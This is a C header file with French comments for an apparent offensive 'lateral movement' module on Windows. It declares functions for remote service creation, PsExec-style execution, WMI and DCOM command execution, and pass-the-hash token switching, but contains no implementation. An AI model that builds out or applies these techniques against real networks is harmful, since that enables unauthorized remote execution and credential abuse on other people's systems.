/**
 * @file lateral.h
 * @brief En-tête module mouvement latéral
 */

#ifndef LATERAL_H
#define LATERAL_H

#include <windows.h>

// ============================================================================
// STRUCTURES
// ============================================================================

typedef struct _LATERAL_RESULT {
    BOOL success;
    DWORD error_code;
    char message[512];
    DWORD remote_pid;
} LATERAL_RESULT;

typedef enum {
    DCOM_MMC20_APPLICATION,
    DCOM_SHELL_WINDOWS,
    DCOM_SHELL_BROWSER_WINDOW
} DCOM_METHOD;

// ============================================================================
// SCM - Service Control Manager
// ============================================================================

BOOL Lateral_SCM_CreateService(
    const char* target_host,
    const char* service_name,
    const char* binary_path,
    LATERAL_RESULT* result
);

BOOL Lateral_SCM_DeleteService(
    const char* target_host,
    const char* service_name
);

BOOL Lateral_SCM_PsExec(
    const char* target_host,
    const char* local_exe_path,
    const char* arguments,
    LATERAL_RESULT* result
);

// ============================================================================
// WMI - Windows Management Instrumentation
// ============================================================================

BOOL Lateral_WMI_Execute(
    const char* target_host,
    const char* username,
    const char* password,
    const char* command,
    LATERAL_RESULT* result
);

// ============================================================================
// DCOM - Distributed COM
// ============================================================================

BOOL Lateral_DCOM_MMC20(
    const char* target_host,
    const char* command,
    LATERAL_RESULT* result
);

BOOL Lateral_DCOM_ShellWindows(
    const char* target_host,
    const char* command,
    LATERAL_RESULT* result
);

BOOL Lateral_DCOM_Execute(
    const char* target_host,
    const char* command,
    DCOM_METHOD method,
    LATERAL_RESULT* result
);

// ============================================================================
// Pass-the-Hash
// ============================================================================

BOOL Lateral_SetPTHContext(HANDLE hToken);
BOOL Lateral_RevertContext(void);

// ============================================================================
// Interface principale
// ============================================================================

BOOL Lateral_AutoExecute(
    const char* target_host,
    const char* command,
    const char* username,
    const char* password,
    LATERAL_RESULT* result
);

const char* Lateral_ListMethods(void);

#endif // LATERAL_H
